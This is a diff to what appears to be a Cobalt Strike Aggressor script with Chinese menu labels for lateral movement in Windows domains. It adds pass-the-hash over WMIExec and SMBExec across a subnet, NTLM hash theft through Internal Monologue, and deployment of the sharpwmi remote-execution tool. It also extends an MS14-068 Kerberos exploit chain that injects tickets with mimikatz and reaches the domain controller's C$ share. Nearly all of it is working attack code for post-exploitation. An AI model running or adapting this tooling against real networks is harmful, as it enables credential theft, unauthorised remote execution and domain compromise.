@@ -4,7 +4,7 @@
 menu "横向移动" {
 	menu "Pass The Hash" {
 		item "Invoke-WMIxec" {
-			$dialog = dialog("WMIexec" , %(bid => $1["@"] , IP => "192.168.1.1" , Domain => "test.com" , command => "whoami" , user => "test" , hash => "xxx" )  ,&Wmiexec);
+			$dialog = dialog("WMIexec" , %(bid => $1["@"] , IP => "192.168.111.130" , Domain => "Mikasa.com" , command => "whoami" , user => "administrator" , hash => "xxx" )  ,&Wmiexec);
 			dialog_description($dialog,"使用WMIexex来进行哈希传递");
 			drow_text($dialog, "IP" ,"单个IP:");
 			drow_text($dialog, "Domain" ,"域名:");
@@ -30,6 +30,17 @@ menu "横向移动" {
 
 		}
 		separator();
+		item "Invoke-Hash" {
+			$dialog = dialog("Hash" , %(bid => $1["@"] , IP => "192.168.111.0/24" , user => "administrator" , hash => "xxx" , type => "WMIExec" ) ,&InvokeHash);
+			dialog_description($dialog,"通过WMIExec或者SMBExec来进行Hash传递");
+			drow_text($dialog,"IP","IP范围");
+			drow_combobox($dialog,"type","类型",@("WMIexec","SMBExec"));
+			drow_text($dialog,"user","用户名");
+			drow_text($dialog,"hash","hash");
+			dbutton_action($dialog,"Exploit!");
+			dialog_show($dialog);
+		}
+		separator();
 		item "Mimikatz-Pth" {
 			$dialog = dialog("Mimikatz-pth" , %(bid => $1["@"] , Domain => "Mikasa.com" , user => "administrator" , hash => "xxx" ) ,lambda({ bpassthehash($3["bid"],$3["Domain"],$3["user"],$3["hash"]); }));
 			dialog_description($dialog,"使用mimikatz进行hash传递,因为Mimikatz的工作机制必须要有本地的管理员权限");
@@ -49,10 +60,73 @@ menu "横向移动" {
 			dbutton_action($dialog,"Exploit");
 			dialog_show($dialog);
 		}
+		item "NTLM hash"{
+    		local('$bid');
+               foreach $bid ($1){
+                   internal_monologue($bid);
+            }
+    	}
+sub internal_monologue{
+	$binary = script_resource("/modules/LateralMove/InternalMonologue.exe");
+	$help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
+	beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
+	if(!-exists $binary)
+	{
+		berror($1, "InternalMonologue binary cannot be found at $binary");
+		return;
+	}
+	$args = "-Downgrade True -Verbose True";
+	bexecute_assembly($1, $binary, $args);
+}		
+
+ menu "sharpwmi" {
+			item "上传sharpwmi" {
+				$bid = $1;
+				$dialog = dialog("上传sharpwmi", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &sharpwmi_up);
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub sharpwmi_up {
+
+        bupload($bid, script_resource("/modules/LateralMove/sharpwmi.exe"));
+    
+
+}
+                item "运行sharpwmi"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("运行sharpwmi",%(ip => "127.0.0.1", username => "administrator", password => "password", type => "cmd or upload", cmd/path => "cmd or upload path",bid => $bid),&sharpwmi_run);
+                    dialog_description($Dialog, "这是一个基于135端口来进行横向移动的工具，具有执行命令和上传文件功能，通过wmi来执行命令，通过调用来进行数据传输,目前只支持上传512kb以下的文件，因为重置每个值的长度不能超过512kb。");
+                    drow_text($Dialog, "ip", "ip: ");
+					drow_text($Dialog, "username", "username: ");
+					drow_text($Dialog, "password", "password: ");
+					drow_text($Dialog, "type", "cmd/upload: ");
+					drow_text($Dialog, "cmd/path", "cmd/path: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+
+sub sharpwmi_run{
+    local('$Name $username $password $type $cmd/path');
+    $Name = $3['ip'];
+	$username = $3['username'];
+	$password = $3['password'];
+	$type = $3['type'];
+	$cmd/path = $3['cmd/path'];
+	bshell($bid, "sharpwmi.exe  $+ $Name  $+ $port  $+ $username  $+ $password  $+ $type  $+ $cmd/path");
+} 
+        	item "删除sharpwmi"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q sharpwmi.exe");
+        	}
+		}
+}
 	}
 	separator();
 	menu "Pass The Ticket" {
 		item "Ms14-068(KB3011780)" {
+			show_message("使用此方法会清除本地凭据!!");
 			$dialog = dialog("Ms14-068", %(bid => $1["@"] , Domain => "Mikasa.com" , user => "administrator" , password => "123456" , user_sid => "域用户SID" , DC_name => "域控") , &Ms14_068);
 			dialog_descrption($dialog,"微软PAC检验不严格导致的漏洞");
 			drow_text($dialog,"Domain","域名:");
@@ -91,25 +165,32 @@ menu "横向移动" {
 }
 
 sub Wmiexec {
-	bpowershell_import($3["bid"],script_resource("./modules/Invoke-WMIExec.ps1"));
+	bpowershell_import($3["bid"],script_resource("./modules/LateralMove/Invoke-WMIExec.ps1"));
 	$payload = "Invoke-WMIExec -Target " . $3["IP"] . " -Domain " . $3["Domain"] . " -Username " . $3["user"] . " -Hash " . $3["hash"] . " -Command \"" . $3["command"] . "\"" . " -verbose";
 	bpowershell($3["bid"],$payload);
 }
 
 sub SMBexec {
-	bpowershell_import($3["bid"],script_resource("./modules/Invoke-SMBExec.ps1"));
+	bpowershell_import($3["bid"],script_resource("./modules/LateralMove/Invoke-SMBExec.ps1"));
 	$payload = "Invoke-SMBExec -Target " . $3["IP"] . " -Domain " . $3["Domain"] . " -Username " . $3["user"] . " -Hash " . $3["hash"] . " -Command \"" . $3["command"] . "\"" . " -verbose";
+	bpowershell($3["bid"],$payload);
+}
+sub InvokeHash{
+	bpowershell_import($3["bid"],script_resource("./modules/LateralMove/Invoke-WMIExec.ps1"));
+	bpowershell_import($3["bid"],script_resource("./modules/LateralMove/Invoke-SMBExec.ps1"));
+	bpowershell_import($3["bid"],script_resource("./modules/LateralMove/Invoke-TheHash.ps1"));
+	$payload = "Invoke-TheHash -Type " . $3["type"] . " -Target " . $3["IP"] . " -Username " . $3["user"] . " -Hash " . $3["hash"];
 	bpowershell($3["bid"],$payload);
 }
 
 sub pth_injection_Ticket {
 	if ( -is64 $3["bid"] )
 	{
-		bupload($3["bid"], script_resource("./modules/kekeo/x64/kekeo.exe"));
+		bupload($3["bid"], script_resource("/modules/LateralMove/kekeo/x64/kekeo.exe"));
 	}
 	else
 	{
-		bupload($3["bid"], script_resource("./modules/kekeo/Win32/kekeo.exe"));
+		bupload($3["bid"], script_resource("/modules/LateralMove/kekeo/Win32/kekeo.exe"));
 	}
 	$payload = "kekeo.exe \"tgt::ask /user:" . $3["user"] . " /domain:" . $3["Domain"] . " /ntlm:" . $3["Hash"] . "\" \"exit\"";
 	$file_name = "TGT_" . $3["user"] . "@" . $3["Domain"] . "_krbtgt~" . $3["Domain"] . "@" . $3["Domain"] . ".kirbi";
@@ -118,10 +199,12 @@ sub pth_injection_Ticket {
 }
 
 sub Ms14_068 {
-	bupload($3["bid"],script_resource("./modules/MS14-068.exe"));
+	bupload($3["bid"],script_resource("./modules/LateralMove/MS14-068.exe"));
 	$payload = "ms14-068.exe -u " . $3["user"] . "@" . $3["Domain"] . " -s " . $3["user_sid"] . " -d " . $3["DC_name"] . "." . $3["Domain"] . " -p " . $3["password"];
+	bmimikatz($3["bid"],"kerberos::purge");
 	bshell($3["bid"],$payload);
 	bmimikatz($3["bid"],"kerberos::ptc TGT_" . $3["user"] . "@" . $3["Domain"] . ".ccache");
+	bshell($3["bid"],"dir \\\\" . $3["DC_name"] . "\\C$");
 }
 
 
